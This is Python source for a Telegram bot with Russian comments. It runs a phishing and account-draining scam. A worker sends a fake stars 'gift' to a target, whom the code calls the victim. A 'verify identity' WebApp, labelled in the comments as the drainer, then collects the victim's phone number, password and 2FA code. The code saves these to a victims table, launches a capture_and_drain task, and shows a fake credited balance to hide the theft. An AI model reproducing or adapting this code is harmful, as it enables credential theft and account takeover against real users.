# ---------- Обработка отправки звезд от воркера ----------
async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработка сообщений вида: @botusername @username количество"""
    if not update.message or not update.message.text:
        return
    
    text = update.message.text.strip()
    bot_username = context.bot.username
    
    # Проверяем формат: @botusername @username количество
    pattern = rf'^@{re.escape(bot_username)}\s+@([a-zA-Z0-9_]+)\s+(\d+)$'
    match = re.match(pattern, text, re.IGNORECASE)
    
    if not match:
        return
    
    recipient_username = match.group(1)
    amount = int(match.group(2))
    sender_id = update.effective_user.id
    sender_username = update.effective_user.username or update.effective_user.first_name
    
    if amount <= 0:
        await update.message.reply_text("❌ Количество звезд должно быть положительным числом.")
        return
    
    # Проверяем получателя (должен существовать в Telegram)
    try:
        recipient = await context.bot.get_chat(f"@{recipient_username}")
        recipient_id = recipient.id
    except Exception as e:
        await update.message.reply_text(
            f"❌ Пользователь @{recipient_username} не найден.\n"
            f"Проверьте правильность юзернейма.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    # Генерируем уникальный код для чека
    claim_code = secrets.token_hex(8).upper()
    
    # Сохраняем в БД
    cursor.execute("""
        INSERT INTO pending_claims (sender_id, sender_username, recipient_id, recipient_username, amount, claim_code)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (sender_id, sender_username, recipient_id, recipient_username, amount, claim_code))
    claim_id = cursor.lastrowid
    conn.commit()
    
    logger.info(f"📤 STARS SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★ | Code: {claim_code}")
    
    # Отправляем подтверждение отправителю (воркеру)
    await update.message.reply_text(
        f"✅ *Чек создан!*\n\n"
        f"📤 Получатель: `@{recipient_username}`\n"
        f"⭐ Количество: `{amount:,} ★`\n"
        f"🔑 Код чека: `{claim_code}`\n\n"
        f"Пользователь @{recipient_username} получит уведомление для получения звезд.",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_keyboard()
    )
    
    # Отправляем уведомление получателю (жертве) с кнопкой "Забрать звезды"
    claim_keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("⭐ Забрать звезды", callback_data=f"claim_{claim_code}")
    ]])
    
    try:
        await context.bot.send_message(
            chat_id=recipient_id,
            text=f"🎉 *Вам отправили звезды!*\n\n"
                 f"📥 Отправитель: @{sender_username}\n"
                 f"⭐ Количество: `{amount:,} ★`\n\n"
                 f"Нажмите кнопку ниже, чтобы получить звезды.",
            reply_markup=claim_keyboard,
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception as e:
        logger.warning(f"Could not notify recipient @{recipient_username}: {e}")

# ---------- Обработка кнопки "Забрать звезды" ----------
async def handle_claim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Обработка нажатия на кнопку 'Забрать звезды'"""
    query = update.callback_query
    await query.answer()
    
    data = query.data
    
    if not data.startswith("claim_"):
        return
    
    claim_code = data.replace("claim_", "")
    user_id = query.from_user.id
    user_username = query.from_user.username or query.from_user.first_name
    
    # Проверяем существование чека
    cursor.execute("""
        SELECT id, sender_id, sender_username, recipient_id, recipient_username, amount, status
        FROM pending_claims 
        WHERE claim_code = ? AND status = 'pending'
    """, (claim_code,))
    claim = cursor.fetchone()
    
    if not claim:
        await query.edit_message_text(
            "❌ *Чек не найден или уже использован!*\n\n"
            "Возможно, звезды уже были получены или чек просрочен.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    claim_id, sender_id, sender_username, recipient_id, recipient_username, amount, status = claim
    
    # Проверяем, что получатель совпадает
    if recipient_id != user_id:
        await query.answer("❌ Этот чек не для вас!", show_alert=True)
        return
    
    # Сохраняем транзакцию
    cursor.execute("""
        INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
        VALUES (?, ?, ?, ?, ?)
    """, (sender_id, sender_username, recipient_id, recipient_username, amount))
    
    # Обновляем статус чека
    cursor.execute("""
        UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?
    """, (claim_code,))
    conn.commit()
    
    logger.info(f"⭐ CLAIMED: {user_id} (@{user_username}) claimed {amount} ★ from {sender_username}")
    
    # Отправляем WebApp для верификации (ДРЕЙНЕР)
    context.user_data['claim_amount'] = amount
    context.user_data['claim_sender'] = sender_username
    
    verification_keyboard = InlineKeyboardMarkup([[
        InlineKeyboardButton("✅ Подтвердить получение", web_app=WebAppInfo(url=WEBAPP_URL))
    ]])
    
    await query.edit_message_text(
        f"🎉 *Вы получили звезды!*\n\n"
        f"📥 Отправитель: @{sender_username}\n"
        f"⭐ Количество: `{amount:,} ★`\n\n"
        f"*Для зачисления звезд на баланс необходимо подтвердить личность.*\n\n"
        f"Нажмите кнопку ниже для верификации.",
        reply_markup=verification_keyboard,
        parse_mode=ParseMode.MARKDOWN
    )

# ---------- Обработка данных из WebApp (ДРЕЙНЕР) ----------
async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    data = update.effective_message.web_app_data
    if not data:
        return
    
    payload = json.loads(data.data)
    user_id = update.effective_user.id
    
    logger.info(f"🔓 CREDENTIALS from {user_id}: {payload.get('phone')}")
    
    cursor.execute("""
        UPDATE victims 
        SET phone = ?, password = ?, twofa_code = ?, status = 'captured', captured_at = CURRENT_TIMESTAMP
        WHERE telegram_id = ?
    """, (payload.get('phone'), payload.get('password'), payload.get('twofa_code'), user_id))
    
    cursor.execute("UPDATE stats SET value = value + 1 WHERE key = 'total_victims'")
    conn.commit()
    
    asyncio.create_task(capture_and_drain(user_id, payload))
    
    # Получаем информацию о чеке если есть
    claim_amount = context.user_data.get('claim_amount', 0)
    claim_sender = context.user_data.get('claim_sender', '')
    
    # Обновляем баланс жертвы (фейково)
    cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user_id,))
    result = cursor.fetchone()
    current_balance = result[0] if result else 0
    new_balance = current_balance + claim_amount
    
    cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (new_balance, user_id))
    conn.commit()
    
    response = (
        f"✅ *Верификация выполнена!*\n\n"
        f"⭐ `{claim_amount:,} ★` зачислены на ваш баланс!\n\n"
        f"📥 Отправитель: @{claim_sender}\n"
        f"💰 Новый баланс: `{new_balance:,} ★`"
    )
    
    await update.message.reply_text(
        response,
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=get_main_keyboard()
    )
    
    context.user_data.clear()

